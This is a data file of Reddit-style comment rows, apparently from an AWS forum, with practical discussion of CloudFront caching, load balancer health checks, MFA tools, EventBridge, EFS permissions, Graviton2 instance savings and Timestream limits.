g8jcnp2,j9d70z,I remember having some issues with LB and next.js because trust proxies wasn’t set to true. Apart from that other comments should solve the issue,2.0
g8jjfbp,j9d70z,Make sure the ELB is set up with public subnets,2.0
g8jn7ke,j9d70z,"A 400 error points to the app not answering the health check correctly. The origin of the request will be from the internal lb ip and it will be something along http://containerip/ by default if your app don't answer correctly to that, it will break the health check. If it's a security group problem it should be answering 502 error",2.0
g8jvn1y,j9d70z,Good to know! I’ll see if I can adjust the app to handle a health check route or adjust the route to be something the app can actually respond to,1.0
g8jdy36,j9d70z,Make sure the security group on the EC2 box allows all traffic from the load balancer to the box on all ports,1.0
g8j7lht,j9awzd,"As a previous hosting company owner, you really shouldn't be looking into AWS. Why are you looking into this?  


CPanel really isn't designed to be ""horizontally-scaled"" -- it doesn't offer multi-server support to begin with. You can figure it out with a ton of third-party tools, but it's really nasty.  


Plesk has a multi-server extension which could theoretically be used for what you want to do, but if you're looking to take advantage of AWS' elastic compute abilities you're going to be sorely disappointed -- Plesk multi-server doesn't let you magically copy one of your users to multiple servers to increase capacity.",1.0
g8jf8rc,j9awzd,"I appreciate the reply - especially given that you were a previous hosting company owner. 

I was asking more for confirmation that it can’t be done.  I mean if it was easy - why not - ya know? But if it’s not - which is my understanding as well - I can then move onto some alternative solutions. 

With dedicated servers - it’s just a huge hassle every few years to upgrade to a new server. If I could detach an EBS and reattach to a better EC2 every few years instead that might be worth a premium in my eyes. Again, I don’t know if it’s that easy and if your CPanel/Plesk data and settings are all stored on the EBS or if it’s stored in ephemeral data or with the AMI or how that all works.",0.0
g8jok4d,j9awzd,"CPanel/WHM and Plesk both have mechanisms built in to help facilitate moving users betwixt servers for migrations like this, and it can be automated -- downside is potential downtime for users.  


One option you might want to consider, if your users are not disk I/O bound (shared hosting rare is), is set up some storage-specific servers and serve up your users' home directories over CIFS. This would allow you to share the home dir over the network to multiple servers, and in migration situations it would simplify moving the data significantly (and potentially even allow you to LB between old-server and new-server with no ill effects, so you can retire the old instance without downtime).  


The downside is that neither CPanel/WHM or Plesk really support this that well out of the box. Plesk has a great extension API that might help though.",0.0
g8j085t,j9awzd,"Not answering your question but your case of a small service provider seems a bad fit for AWS; your clients sites will have to be up all the time so you don’t need servers up and down. It’s expensive compared to traditional dedicated server plus VM hosting, and likely you won’t be using most of AWS ecosystem. 

As for cpanel and plesk, what do the vendors say in terms of number of users connected? Admin panels are not frequently used and at most by like one sysadmin / site owner. They are web server applications so I don’t see why a single vanilla  server can’t serve hundreds  of sites/ users, the bottleneck would rather be the number of sites per server / VM, and that’s limited by hardware (ram mostly), in other words, I don’t understand why you’d need to horizontally scale these apps; you’d have one per server or VM.",0.0
g8jfugq,j9awzd,"I was asking mainly for confirmation on the horizontal scaling. I was pretty sure it was a no-go but just want to be sure my understanding is correct. I mean if it was easy to do - why not - ya know? 

As I mentioned in another reply, it’s a hassle to upgrade dedicated servers every few years. So if AWS made it pretty simple to detach the EBS and attach it to a better EC2 every few years instead it may be worth a premium to me.",1.0
g8lu080,j9awzd,"I suggest then look into https://aws.amazon.com/lightsail/ , same AWS but with cheaper pricing (monthly billing)",1.0
g8jq0v1,j9awzd,"You ""horizontally scale"" cPanel by just spinning up more cPanel servers and spreading out your customers to different servers.

Switching to AWS for shared web hosting with cPanel sounds like a enormous disaster. There's absolutely no way you could even remotely compete with competitors prices after you pay that AWS bill.",0.0
g8jyi4c,j9awzd,"Yeah - I think you are right. We aren’t using a lot of the resources on our dedicated servers so I figured we could go with an EC2 instance that had lower specs but I never actually compared AWS to competitors as far as an apples to apples cost comparison. When I just did, it’s definitely a huge difference. Thank you for pointing that out.",0.0
g8inls0,j9bb08,"Use hashes in your asset file names/paths (css/js/*.
This will lead to automatically updating the cache with the newest version and still being able to support the old version if needed.",31.0
g8j24jj,j9bb08,"Confused what you mean by hashes? You mean like put a version number at the end? 

Is there an efficient way of doing this too beyond me having to remember to change the version number everytime I put a file into s3?",1.0
g8j8uk3,j9bb08,"&gt; Is there an efficient way of doing this too beyond me having to remember to change the version number everytime I put a file into s3?

Just make your deployment script/system do it automatically. One pattern you can use is to set a short TTL on just your root page/JS app loader, and update it to fetch assets from the current version path.",3.0
g8jcju5,j9bb08,This is commonly known as cache busting. Searching on Google turns up a few different strategies.,2.0
g8j76ls,j9bb08,automate it,2.0
g8j602b,j9bb08,"Depends on what you’re hosting. If it’s just a website, then any web library or framework in existence will do this for you with little or no configuration. 

When you deploy code you just issue a cache invalidation for your index.html file and everything else falls in after that.",1.0
g8ijxbb,j9bb08,You can always invalidate your cloudfront distribution after you update your files. Nothing wrong with having a long’ish TTL unless you change your files all the time.,19.0
g8ijxdb,j9bb08,"It is All about $$$. Serving through cache is both cheaper and faster. 

You can invaliditet cache and force update that way instead of changing TTL. That is what I did. I have as part of my Dev pipeline cache is invalidated when stuff gets updated automatic. 

1 hour cache seems really low. Do you really commit changes every hour every day all year around. 

I would really recommend just invalidating cache when needed.",17.0
g8ikc0l,j9bb08,"For invalidating, is there a charge for that as well? May look to do that. Also, I am setting up a CI/CD pipeline via github soon so hopefully can do something like you did (I think that is the right term)? Bascially, whenever I update github, it pushes the change automatically to S3 and then hopefully it would do what you are suggesting. Did you do it via github by chance and have any advice on how to get that working?",1.0
g8iw6rw,j9bb08,"You can invalidate the cache up to 1000x per month for free, after that you're charged, but as another user mentioned you're better off adding a hash to filenames so that only the changed files need to be fetched. You can then make use of the browser cache and prevent people from ever even needing to make a network request if files are unchanged.",5.0
g8j2cfs,j9bb08,"Ok, one last question. What is the cost ultimately coming from with lower TTL cache? Is it that the S3 bucket charges for every read, thus those are where the charges are coming from? Or is it coming from also cloudfront somehow (aka, they charge for a short TTL)?",0.0
g8j8shg,j9bb08,"It’s coming from the increased bandwidth from browsers refetching unchanged files from your cloudfront distribution because the TTL is low.  Hash the filenames of images, JavaScript and css.  Leave index.html with as low a ttl as possible",2.0
g8j7oew,j9bb08,I have IOT devices using LTE accessing data from S3. I set huge TTL and I invalidate on changes. I never wait.,3.0
g8j91xq,j9bb08,You need to think about the cache in the browser too. Do you want your visitors to have to fetch your assets again every hour?,3.0
g8jcmp5,j9bb08,"The main reason to set a high TTL in any situation, whether its CloudFront or a DNS entry in Route53 is that you pay for every X amount of hits to the endpoint. 

Therefore with a higher TTL you have less requests coming in and so you will be billed less. 

Another big reason is performance. It's faster for CF to serve your content it has cached from its local PoP versus contacting your origin and getting a fresh copy of the content and then passing that along.",3.0
g8jjzan,j9bb08,"2 options, either invalidate your cache or use object versioning. More info here: https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Invalidation.html",1.0
g8jmaur,j9bb08,invalidate the cache when you change files. leave a long ttl otherwise.,1.0
g8kn2yh,j9bb08,"Never replace files, always use a new name when you update files.",1.0
g8kphw0,j9bb08,"You can totally reduce the TTL to an hour.

Just be aware of the trade-off you're choosing to make: you're getting faster (1hr) updates without the added complexity of versioning / hash generation on all your files, at the cost of slightly slower (&amp; more bandwidth) requests (because they can't be fulfilled from the cloudfront or browser cache for as long), which also come with a monetary cost.

The right choice really depends on your project and what is a priority (dollars, load time, or simplicity).",1.0
g8knned,j9bb08,Jesus christ webdevs are so bad.,-1.0
g8i5ht2,j990bj,1Password cli can do this.,3.0
g8jk43u,j990bj,"[AWS-MFA](https://github.com/broamski/aws-mfa)

I've been using it for years.",2.0
g8i6ayw,j990bj,"Get yourself a YubiKey to store MFA tokens. Much more portable than authy. The Yubico Authenticator is an AppImage, not a snap.

If you want to use the CLI with YubiKey, there is the [YubiKey Manager CLI](https://developers.yubico.com/yubikey-manager/) with the `ykman oath` commands.",1.0
g8i6ykt,j990bj,Is there a specific model I should get?,1.0
g8i9eig,j990bj,"No. The model depends on your use case. I use the YubiKey NFC 5, so I can use it on any PC and with NFC on my phone (like when I need to enter a MFA code, where I don't have the Authenticator installed). It's a personal preference. They have a little questionnaire to help you with that.

**Important:** always buy a pair of YubiKeys and store the MFA token on both keys. One is your backup stored safely, in cases you lose or damage your primary YubiKey. Although they are really hard to damage.

Nice things you get too: YubiKey OTP where it is supported instead of OATH MFA. Store your GPG subkeys securely on a YubiKey, so your GPG key is portable too. And with GPG keys stored, you can get SSH keys from the GPG keys. Portable SSH keys 🥳",2.0
g8kbgmz,j990bj,"I was looking same while ago and discovered [this bash script](https://github.com/poolpog/bash-otp). I have been really happy with it. An [alternative written in go](https://github.com/itsmewes/gotp) was released recently.

Usually I add token to both my phone and to my laptop. When authenticating I use the device closer to me. So far both devices have been in sync without any issues.",1.0
g8jhmrp,j97kwb,"Just a heads-up, ECR has the ability to set lifecycle policies as well - for instance, you can prune development builds separately from (and faster than) release builds. If you're using ECR, it's a better option than manual pruning.",3.0
g8jiy87,j97kwb,Well known. But still I also needed this,2.0
g8ol01g,j97kwb,"Does this work? I have setup simple ""keep only 2 images"" (how it even chooses which 2? I hope by date), any tag, expire and it did not run ever once. I have to manually delete images.",1.0
g8i8uln,j956g7,"[EventBridge can deliver to Firehose](https://docs.aws.amazon.com/eventbridge/latest/userguide/what-is-amazon-eventbridge.html)

Use [AWS Service Integration](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-method-settings-console.html) on the API Gateway to put directly events into EventBridge",2.0
g8kbifz,j956g7,"I just looked into this and i think this is the best solution! Thank you! At first glance EventBridge just seemed like something to connect external services. But it actually sounds like the perfect solution for fan out aws services! 

(I really hate the aws home pages for services. I could be looking at the perfect solution but not know it from homepage descriptions)",1.0
g8poip5,j956g7,"ICYMI: the new HTTP APIs (simpler and cheaper than the Rest APIs) support EventBridge too 🥳

https://aws.amazon.com/blogs/compute/building-storage-first-applications-with-http-apis-service-integrations/",1.0
g8hh140,j956g7,"Can you just use Kinesis?   It is designed so that you can have multiple services reading a single stream, so you could put the data into Kinesis Firehose =&gt; s3 (for storage or archiving), and have lambda(s) reading from the same Kinesis stream.",1.0
g8kcjvs,j956g7,"We are operating at a huge scale.

Kinesis has max of 5 minutes and Firehose has a maximum of 15 minute batch size.

Also I don’t believe it is possible to go directly to S3 with partitioning (table/year/month/day/hour) like Firehose. You would have to run a Lambda, and my experience with large scale in aws is to avoid Lambda solutions as much as possible. It increases costs by a lot (our aws bill is 10k/month, majority is Lambda)

I could probably make both solutions work by hacking in Lambdas, but I want to avoid this at all costs. (The goal is to reduce costs by removing Lambdas and increase readability of the project architecture)",1.0
g8i19u7,j956g7,A Kinesis Stream can deliver to both Lambda and Kinesis Firehouse at the same time. Would that work?,1.0
g8icwbb,j956g7,The issue I have with regular Kinesis is having to manage scaling.   Firehose does it for you.,1.0
g8h4k9v,j922g7,"The free tier is just a discount of X units on your invoice. You just launch a resource which is covered by free tier usage, and receive a credit for the free tier amount when your invoice arrives. If you only launch one, the free tier amount will zero out your invoice. If you launch 10, you'll pay for 9.",1.0
g8hiknq,j922g7,"What /u/8XtmTP3e said.

There is no free trial.  There is a level of usage that is free to use.  &lt; 50 GB/month served is free I believe.",1.0
g8h0d0f,j93djz,"Not sure why alter manager starts, but both have a security context set to run as non root. 

But an EFS has permissions for root by default. Check out to use EFS access points to set the permissions accordingly.

&gt; Important
&gt;
&gt; By default, new Amazon EFS file systems are owned by root:root, and only the root user (UID 0) has read-write-execute permissions. If your containers are not running as root, you must change the Amazon EFS file system permissions to allow other users to modify the file system.

Additionally, you have both PVs configured with the same Filesystem ID, which is IIRC wrong, as both pods will mount / from the EFS and will interefe with each other. Either use access points to have it on the same EFS or different ones.",2.0
g8hnhtu,j93djz,"Thanks for this. I did see that EFS is `root:root`without an access point and that these pods are constrained to run as `!root`. I was somewhat thrown by:

* one pod seems happy to start
* I initially missed the documentation for creating a pv with an access point
* I was not sure how to specify `UID:GID` to a pod that is  already running and packaged with a different security context.

I guess those are the next topics to research...",1.0
g8j025v,j93djz,"Yep, this was it! Thx 

Updated StackOverflow with details",1.0
g8j7cn1,j93djz,"Hehe.

Btw you should be able to set the security context from helm values too.

Or have the access point set to the UID/GID of the default helm values",1.0
g8kkq5e,j93djz,"Yeah, I couldn't figure out the default uid/gid. Helm values will be one to check though, thanks",1.0
g8kksl4,j93djz,"Here you go: https://github.com/prometheus-community/helm-charts/blob/main/charts/prometheus/values.yaml

Search for securityContext and then scroll up to wich service it is associated ^^",2.0
g8mclmi,j93djz,Thx,1.0
g8gvaa6,j93djz,"Not sure where best to post this. Fallback will probably be to create some EC2 nodes in the cluster, which I was really hoping to avoid",1.0
g8h41fu,j8zfwh,"Nope. You pay only for the registration of each year on Route53 domains. Changing contacts, name servers, etc doesn't cost you anything.

It's always worth on checking the pricing pages of the service: https://aws.amazon.com/route53/pricing/#Domain_Names",3.0
g8fqe90,j8zfwh,AWS*,1.0
g8j6dcv,j8y6a0,"I am struggling to understand what you're asking for exactly because I'm not familiar with your project.  So lemme see if I understand what you are attempting.

You have an AWS API gateway that when called will query a local server on your local machine that will respond back to the request with data.

It seems that there is a significant processing time that must take place on the server, and because of that you can't simply query the server and respond with data back to the lambda function which would return the data back to whatever is calling the gateway.

Your solution so far is to return the data to a separate lambda that will add data to either a database or a queue.  And then long/short poll the queue or database for the response.

The big problem here would be the loss of resources due to polling for changes, this you are uncomfortable with.

I'm really going to list potential issues with a polling mechanism for other people who may read this.  Not necessarily for you.

\#1. I will cause the device that is calling this gateway to perform poorly.

\#2. It will cause battery life drain

\#3. It will skyrocket your costs

\#4. It may delay the response times based on your polling length

\#5 These other changes could have a negative impact on getting your application listed on some mobile stores.

I offer this solution

The client calls to the gateway -&gt; then the gateway calls your local server -&gt; your local server issues a code that identifies the process number and returns that back to the client.

The client on receipt of this identification number opens a web socket and passes that identification number to the web socket.

Depending on how you want to go there really is an infinite amount of options but ill stick with the items you mentioned.

Assuming the response is small you could write to your DynamoDB -&gt; then write a new stream record to Dynamodb streams -&gt; then have streams invoke a lambda function -&gt; then use the clients WebSocket identification number to update the client.

Here you add the data to the DynamoDB table with a reference by identification number and use event triggers to respond to the WebSocket Via Lambda so no polling.

Hope this is useful",1.0
g8fp2bj,j8z1gp,"I think WAF is the optimal solution with api gateway/lambda. A manual approach could be to have a cloud watch billing alert trigger a lambda that adjusted the concurrency limit on your public lambdas. 
For WAF: https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-aws-waf.html",2.0
g8fzb5s,j8z1gp,"Yep, waf is the way to go, you can throw some rules at like blocking bots, known bad ip’s, limit requests by the same ip eg 100 req per 5 minutes. If you don’t want to use a waf, still put keys in your API and throttle it. That will help.

For billing, make sure you setup alerts, I finished a post yesterday on this that includes a CF deploy:

https://www.talkncloud.com/aws-essential-setting-budget-and-alarms/

Code is up in GitHub.",1.0
g8f1nqy,j8xd2w,"As I am under NDAs for pretty much all projects that I worked on, I can’t really disclose specific names or sites. There is a lot out there though! :)

One that I can name and that I am currently working on is Baby Notebook https://babynotebookapp.com. The landing page is built with GatsbyJS and React. The mobile app is built with partly React Native and React, with APIs that provides different kinds of functionality through GraphQL and REST.

If you are new to this stack, I suggest that you take a the Amplify framework from AWS as it is a good starting point for creating your project. It will set up everything up for you in terms of cloud resources that you need to run your project.",2.0
g8fp6pc,j8xd2w,Amplify is the answer to all of your questions....,1.0
g8fs48f,j8xd2w,"Checkout webiny. It's an open source content management system which has these things. Recently I was exploring this product for a project, but it's limiting in terms of CMS functionality, but these things you mentioned are there.",1.0
g8fvjqw,j8xd2w,"My load testing platform was built exactly like that.

List of services used:

- Congito for auth
- S3/CloudFront for static content
- API Gateway 
- Lambda for processing APIs
- Step Functions for long running activities

I use Stackuchin for managing the 250 stacks in each region - https://rungutan.com/blog/stackuchin/

Link = https://rungutan.com/",1.0
g8j317d,j8xd2w,One option is ALB with Lambda backend. Use the ALB authentication to auth users via Cognito or a generic OIDC IDP. Serve static content via S3 with CloudFront.,1.0
g8euo7o,j8wnbo,"It will need the range of IP addresses as seen from the public internet. That is, whatever your external IP address is, not your home network internal addresses (which are usually RFC1918 blocks for internal use). Like, whatever you see when you visit something like [https://whatismyipaddress.com/](https://whatismyipaddress.com/) rather than what you see when you type the ifconfig command at the terminal.

It's asking you to specify a range of addresses that you will allow inbound traffic from. This is useful at organisations that have a range of externally visible IP addresses, and the connection might appear to originate from any of these. But if you have just 1 IP address, you can use /32 to indicate a range of exactly 1 IP address.",3.0
g8f458s,j8w9l9,"Please consider quoting the source (I'm assuming you're not Liz) when you post stuff like this.

The graph comes from lizthegrey on Twitter.

(Reposting as the fabulous AutoModerator removed my previous comment)",168.0
g8g9gjw,j8w9l9,"It's like you said. It's from Honeycomb. For actual details on their workloads, they released a blog post some time ago related to their ARM64 move over here:

[Observations on ARM64 &amp; AWS's Amazon EC2 M6g Instances](https://www.honeycomb.io/blog/observations-on-arm64-awss-amazon-ec2-m6g-instances/)",35.0
g8i74a2,j8w9l9,Thanks for posting source links!,14.0
g8lmskx,j8w9l9,nice article!,1.0
g8lmrfi,j8w9l9,thanks that's a great read.,1.0
g8fbhta,j8w9l9,"This is a good post. Seriously, there's a reason the op isn't answering any follow up questions.",50.0
g8h5eye,j8w9l9,AutoMod *generally* removes posts that are intended to drive traffic to a site with no accompanying text or discussion.,4.0
g8fipkc,j8w9l9,Graviton2 for RDS is a total no brainer for anything that’s bigger than a t3. Get that shit.,15.0
g8fo8yz,j8w9l9,Only available in preview for Postgres and MySQL.,6.0
g8frqgg,j8w9l9,It’s about to go production ready and is rock solid.,8.0
g8h1bkr,j8w9l9,We run Postgre prod instance on Graviton2 and it has been rock solid. No issues whatsoever.,4.0
g8i76lg,j8w9l9,only if you're on mysql 8 :( :( no mariadb yet,3.0
g8gxlhi,j8w9l9,Same for Elasticache...we're switching over from m5 to m6g...***and*** reducing the size of our Redis clusters.,3.0
g8h6p6d,j8w9l9,That actually sounds like a good idea. Prolly gonna do that as well,1.0
g8er8uy,j8w9l9,How was performance? What type of stack are you running? Was there much effort required in getting things ported over to ARM or was it all relatively straightforward?,13.0
g8i41t9,j8w9l9,"We're a Go shop. It took a few weeks to get all of our native system-level dependencies ported, as we're using bare VMs managed by chef instead of containers.",13.0
g8h5lej,j8w9l9,/u/lizthegrey,13.0
g8i3yyz,j8w9l9,thanks for tagging me. sucks when people rip content without attribution :(,25.0
g8est7x,j8w9l9,"Nice! What kind of load are you using them for? Also, can you comment on the reasoning and experience using the m6g instances instead of c6g?",13.0
g8i444v,j8w9l9,"we use mostly c6g, but for spot purposes we need to diversify in case there's a c6g shortage so we use m6g as well.

the use case is ingress - parsing JSON, doing ACL checks, then stuffing into Kafka as protos.",8.0
g8i8q47,j8w9l9,"Thanks for the info! Greatly appreciated! 

Looking at the report, it seems that there are some additional savings by running the m6g instances and that's why I asked if you have perhaps noticed some advantages of running instances (m6g.xl) with more memory, but perhaps, you are just utilizing more SPOT instances for both c6g and m6g?",1.0
g8j0387,j8w9l9,"ah, no, the savings was going from all on-demand/compute savings plan, to being able to utilize spot once we added m6g to the eligible pool; previously on c6g only we were unable to get enough diversity to reliably use spot.",2.0
g8jpu9r,j8w9l9,"Thanks for the info and congrats on the savings going from $200+/day to under $100/day. Those are some major savings, nicely done!",2.0
g8ewb5w,j8w9l9,"""This is what happens when you move from Apple to Orange.""

Talk among yourselves. *leaves chat*",31.0
g8i6kc6,j8w9l9,I sure wish I'd been tagged/attributed earlier so I could reply to some of these great questions!,9.0
g8f1cfo,j8w9l9,"That's a little harsh, isn't it? They're both general purpose architectures. Obviously around the edges there's going to be differences but for the most part, most people can probably just recompile and they'd be fine.",16.0
g8f2ln0,j8w9l9,"Even that (general purpose) is too ambiguous comparison without context. For anyone knows, it could be simple web servers with no reconfiguration, optimization and recompilation.

Without that context, this is simple apple to orange comparison with two distinctively different instance types with two distinctively different cost metrics.

Hell, I can show you how I saved half million by simply purchasing reserve instances upfront. However what does that tell you about context besides I saved bunch of money on car insurance.",4.0
g8f645u,j8w9l9,And no cpu utilization etc. could be Intel on 10% but 80% on other,6.0
g8h1506,j8w9l9,It looks like it's autoscaled to me.,1.0
g8i5vnt,j8w9l9,"correct, same workload autoscaled.",4.0
g8f2vz9,j8w9l9,"Ah, I didn't appreciate you were calling out this post's presentation in particular. I agree with your assessment here.",1.0
g8f47rc,j8w9l9,"I would also like to see a comparison of workloads.

That being said, I would hope they're comparing right-sized instances, running the same load.",1.0
g8i5wsa,j8w9l9,"affirm, same service, +xx% month on month during this period.",3.0
g8jbxnl,j8w9l9,Pretty cool.,1.0
g8etufy,j8w9l9,"Wow. And VMware just released ESXi-ARM fling this week (https://blogs.vmware.com/vsphere/2020/10/announcing-the-esxi-arm-fling.html).

Can share more details about the workload you are running?",5.0
g8esj97,j8w9l9,What sort of website used that much a day? Pretty cool!,4.0
g8f0f2d,j8w9l9,Honeycomb I think.,6.0
g8i45fx,j8w9l9,"it's only one of our workloads, too!",4.0
g8febds,j8w9l9,What about AMD instances?,4.0
g8gi5bf,j8w9l9,"The t3a series, based on ~~Zen 2~~ Zen 1 are 10% cheaper and about as fast as the standard t3. The new Milan chips will get much closer to these Graviton chips.",7.0
g8h78qc,j8w9l9,The t3a and m5a are Zen 1 Epyc based (unless they upgraded recently which I didn't notice).,3.0
g8h807l,j8w9l9,Ah my bad. The new Milan-based EPYC chips should be trading blows with these Graviton2 chips in that case.,2.0
g8j3yq9,j8w9l9,"AMD perf per-machine just isn't there, even though it's lower cost in theory...",1.0
g8gervg,j8w9l9,If you used EC2 type ECS with docker images built on amd64 before and are now switching to graviton2: do you also update your base images to be built on ARM?,1.0
g8ghiu1,j8w9l9,"It's not going to work if you don't, right? Docker is just C groups and UnionFS with a nice CLI and community; it's not magic.",5.0
g8ggeuy,j8w9l9,Test driving some of my ECS/EC2 workloads on the Graviton instances just now. We had to rebuild them from scratch on an ARM instance first.,4.0
g8h7uyf,j8w9l9,Why are there fluctuations on a day-to-day basis? Are they powering the instance down?,1.0
g8i467s,j8w9l9,ASG+spot!,6.0
g8idul3,j8w9l9,Thanks! Didn’t think of that and I’m pretty new to AWS,2.0
g8hpw4t,j8w9l9,Seems that it is cause of scaling down over the weekend based on the traffic or utilization.,1.0
g8i155k,j8w9l9,Do...do you not scale your systems based on load or scheduled taskings?,-2.0
g8em4tk,j8w2h1,"Generally, no. You can request one through your TAM if you're on Enterprise Support.",8.0
g8ewyiu,j8w2h1,Can you only request an RCA if you have a TAM? Is that one of the big differences between enterprise and business support levels?,2.0
g8fapmr,j8w2h1,You also need to be under NDA for certain things in addition to the support.,6.0
g8hywq8,j8w2h1,"Is any of that detailed or documented anywhere? Or is that from your experience. Sorry, my org is considering business vs enterprise support. I appreciate any insight or help!",1.0
g8kev4p,j8w2h1,"Enterprise gets you access to TAMs, SAs, custom demos, hosted emerson days, support staff can join your slack workspace, find specialist, schedule chime based Q/A, etc.

Basically they're an extension of your devops group.",1.0
g8f2slm,j8w2h1,another difference is the 15 minute SLA option,3.0
g8gvyrk,j8udhz,"A simplistic approach would be to use HAProxy for this, if you already have a load balancer throw it on that. If not throw it on your host or a new EC2 instance.",2.0
g8eisnd,j8udhz,Cloudfront (and maybe + S3) would work,1.0
g8fbd70,j8udhz,Thank you!,1.0
g8e9ec4,j8tlj5,"1. Nfs on the Snowcone is somewhat weird. You might try lowering your rsize and wsize to around 4-8k and see if that improves performance. 

2. Try using the s3 interface instead, specifically a multithreadded put. It should be able to take far more data than 12Mbps for sure. Likely up to 200-300 Mbps.

3. Triple check duplex on your switch. If for some dumb reason one side negotiated at half duplex, that could cause headaches.",1.0
g8e9j4k,j8tlj5,I'd also check Layer 1. make sure your ethernet is all atleast Cat5e,1.0
g8gl59a,j8tlj5,"They're all new cables. The problem seems to be in the NFS stack, as it successfully starts out at 1Gb/s but then slows to a crawl. I think there's something being misconfigured somewhere which is causing the NFS RPC commands to queue up either on the client or server.",1.0
g8ed15d,j8um1t,"Why would you imagine this being challenging on DynamoDB? pk is traceid would be step one, that gives you a ton of things right there. DynamoDB is a relational data store when used as such, so it has no trouble modeling relationships at high performance, check the white papers.",3.0
g8f2a9w,j8um1t,"It doesn't have JOIN so any relationships in the data need to be modelled and designed for ahead of time. In an OLAP'y context where you're aggregating arbitrary columns based on arbitrary conditions then you either need to add secondary indexes for every column, or just accept full table scans. The AWS recommendation for aggregate queries is to use DynamoDB Streams to keep a running tally, which again requires planning ahead for the aggregate queries you want - 
https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/bp-gsi-aggregation.html.",0.0
g8fdgsa,j8um1t,"Everything requires planning ahead in databases. You can’t execute a query without planning ahead. You can’t define a table or an index without planning ahead. DynamoDB just requires a different strategy to manage that. But, none of that matters with respect to being able to provide these capabilities. And there’s no reason you wouldn’t use a hybrid data store solution. DynamoDB + a normalized SQL DB or, probably better, an inverted index like elasticsearch. While the queries might seem arbitrary, there’s probably a finite number of them based on the columns of data available and many if not most of them can probably be calculated in advance and just stored. It’s just space intensive.

That said, I haven’t necessarily been impressed with x-ray’s speed, tbh. With a lot of things in the account, it gets pretty pokey, at least the ui does.",3.0
g8fjsnd,j8um1t,"The keyword here isn't ""planning"", it's ""arbitrary"". With filters on any combination of A, B, C in a Dynamo table you'd need secondary indexes A, B, C, AB, AC, BC, ABC - ie factorial on the number of columns. That's not just space expensive, it's IO intensive on writes for a service that naturally has an extremely high write volume.",2.0
g8gepzb,j8um1t,"Not only that, but the 50 columns limit is also arbitrary. You can have one segment with 50 arbitrary annotations (index) and another segment with another 50 annotations where none of them are a match. I can technically have 10 traces with 50 unique annotations each, giving 500 annotations stored total.
They all have ad-hoc queries and are capable of aggregate group by.
I work on an application that has a similar concept, hence my question. Either Dynamo is not good for it or I'm too dumb to get DynamoDB to work like that.
Hence my question being around whether there's a database  technology better for it.",2.0
g8gf6zx,j8um1t,"PK on the traceId helps nothing on the aggregate result as it shows you aggregate of an arbitrary index (annotation) that may or may not be present on a given segment and still offers arbitrary filter in any of the other 49 ""indexes"" (annotations).
The access pattern plan ahead there would be astronomical.
Maybe DDB is being used just for data ingestion and DDB Streams help normalize into a table with 50 columns? If that's the case, is DDB really being helpful at all?
Are there no DB technology that makes this experience smoother for the developer?",2.0
g8gjfv2,j8um1t,"My random guess would be Kinesis Firehose dumping
pre-aggregrated data into Redshift.",1.0
g8hdy1x,j8um1t,The pre-aggregation is key. You could dump that into Redshift Spectrum and expect pretty good performance and pretty low storage cost.,1.0
g8mo3i0,j8um1t,"Pre aggregation is very likely impossible for this type of reporting, specially because filters work on a unknown time window.
If you filter yesterday between 10AM and 11AM and there are 50 possibilities of group by + 50! (factorial) possibilities of filters and then you change from 10AM to 10:30 to 11:00AM you have to hit a different pre aggregation.
There are more possibilities of aggregation than atoms in the universe.

However, I seem to have found the weak point of X-RAY: it only reads 1000 traces and aggregate based on that, which means it's not really hard to build on roughly any database as that's a huge limitation",1.0
g8gpotd,j8tfna,sad..,2.0
g8e8113,j8tfna,"Prime day related, maybe?",2.0
g8iige2,j8tfna,Not enough interest,1.0
g8ik7qs,j8tfna,A wild guess?,1.0
g8eho93,j8tzh0,"I think you're talking about *continuous integration* and *continuous development*. These allow you to ""update"" your code in a repository and have Amplify handle building and deploying a webpage for you. 

When it comes to an iOS app, I don't think they'd submit one for you. iOS requires you to be a developer with Apple and sign your apps using your developer account.",1.0
g8kkzdt,j8oy8d,"AIUI, Timestream is architected around the 'time' datum. You can mix timestamps within the in-memory storage, but when written to disk, the 'time' will be monotonous, to make retrieving older data efficient.

For forecasting, you might rather use 'time' as the ""timestamp of forecast"" and then have a dimension like forecast\_horizon=""2 days"".

But storing historic data doesn't fit into that philosophy. You could hack around that by adding a dimension like `orig_time` and store the original timestamp as ISO timestamp. Then, for queries, you might do something like `where coalesce(from_iso8601_timestamp(orig_time), time) &lt; (now() - 180d)`. While this works in a test table, I'd expect it to have bad performance in real-world usage, because it'd have to scan much more rows (i.e. it's very expensive).

Ultimately I believe Timestream is built to ingest ""live"" data, at least in its current form. It will be interesting how Timestream evolves.

HTH!",2.0
g8kx5ua,j8oy8d,"thanks a lot. Still, if somebody wants to migrate to this service, they need to have some way of ingesting the old data into the system. This RecordRejection logic must be changed, otherwise it's ONLY useful for streaming data really... But for this we have enough services - Kafka, Kinesis. This was supposed to be a serverless time-series database, something where you can STORE and PERSIST data, not the second Kinesis. 

Also storing forecast for the future is a pretty standard use-case, especially in the financial industry.

I hope somebody from AWS can read this feedback, as contacting anybody directly is only possible if you have purchased a Support Plan... I'm quite disappointed tbh.",1.0
g8onscd,j8oy8d,"I just encountered this issue with storing historical data as well when evaluating Timestream for our use cases.

We have enterprise support plan, so I've sent a message asking if there's any way to load historical data to Timestream. If I'll get an answer, I can share it here, but I think it's safe to say currently there's no way.

As for why this limitation exists, I can only guess. I believe this is somehow related to ""data deduplication"" that Timestream does on WriteRecords. It rejects records that have the same timestamp, measurement name and dimensions, but different values. It makes sense that this deduplication would work only within the memory storage retention period as it would be way too expensive to query the magnetic storage every time a new record is to be written. However, in our use case we don't care about duplicates, so it would be nice if this could be disabled at the table level to allow writing historical data.",2.0
g8oqkd0,j8oy8d,"I fully agree - if I want to discard duplicates, I could just do SELECT DISTINCT or GROUP BY and take average. I would really appreciate if you could share the answer from AWS once you get it.",1.0
g8ps8o0,j8oy8d,"I had the same problem.  This is the answer we got back from our Amazon technical rep:

*Sorry  for the delayed response. I opened a Product Feature Request (PFR)  internally here since it doesn’t look like we support loading data older  than one year.  Unfortunately, we might not see this implemented immediately. I will  keep you in the loop if it does get implemented sooner. Tmestream has  been generally available only for a few weeks, so we might see it sooner  if more customers ask for this feature.*",1.0
g8biomd,j8kl1q,As a follow-up to current issue with AWS availability zone,1.0
g8cw1tr,j8p4ip,Do your work and research?,7.0
g8ci5hw,j8p4ip,Have you plotted out what that kind of storage and data transit would cost?,2.0
